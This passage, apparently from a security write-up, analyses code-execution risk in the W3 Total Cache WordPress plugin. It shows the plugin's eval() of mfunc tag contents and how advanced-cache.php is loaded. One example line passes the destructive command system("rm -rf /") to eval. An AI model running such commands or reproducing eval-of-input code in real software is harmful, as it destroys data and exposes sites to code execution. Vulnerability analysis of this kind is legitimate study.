class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code2&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code1&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code2&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;\Exception&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$ex&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Unable&amp;ensp;to&amp;ensp;execute&amp;ensp;code:&amp;ensp;%s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Invalid&amp;ensp;mfunc&amp;ensp;tag&amp;ensp;syntax.&amp;ensp;The&amp;ensp;correct&amp;ensp;format&amp;ensp;is:&amp;ensp;&amp;lt;!--&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;mfunc&amp;ensp;PHP&amp;ensp;code&amp;ensp;--&amp;gt;&amp;lt;!--&amp;ensp;/mfunc&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;--&amp;gt;&amp;ensp;or&amp;ensp;&amp;lt;!--&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;mfunc&amp;ensp;--&amp;gt;PHP&amp;ensp;code&amp;lt;!--&amp;ensp;/mfunc&amp;ensp;W3TC_DYNAMIC_SECURITY&amp;ensp;--&amp;gt;.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;eval()&lt;/code&gt; function at line 11 is very dangerous as it executes a string as PHP code. Example:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system(&amp;#34;rm&amp;ensp;-rf&amp;ensp;/&amp;#34;)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;When the plugin is installed and activated, it adds to the top of &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**&amp;ensp;Enable&amp;ensp;W3&amp;ensp;Total&amp;ensp;Cache&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_CACHE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Added&amp;ensp;by&amp;ensp;W3&amp;ensp;Total&amp;ensp;Cache&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This registers caching for WordPress. &lt;code&gt;WP_CACHE&lt;/code&gt; is used in &lt;code&gt;wp-settings.php&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CACHE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enable_loading_advanced_cache_dropin&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/advanced-cache.php&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/advanced-cache.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_Hook&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build_preinitialized_hooks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wp_filter&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WordPress automatically loads &lt;code&gt;advanced-cache.php&lt;/code&gt; if it exists. When activated, the plugin creates this file:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;global&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$w3tc_start_microtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$w3tc_start_microtime&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;microtime&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_INSTALLING&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_INSTALLING&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_IN_MINIFY&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DIR&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#x9;&#x9;&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;W3TC_DIR&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_PLUGIN_DIR&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_PLUGIN_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_CONTENT_DIR&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span 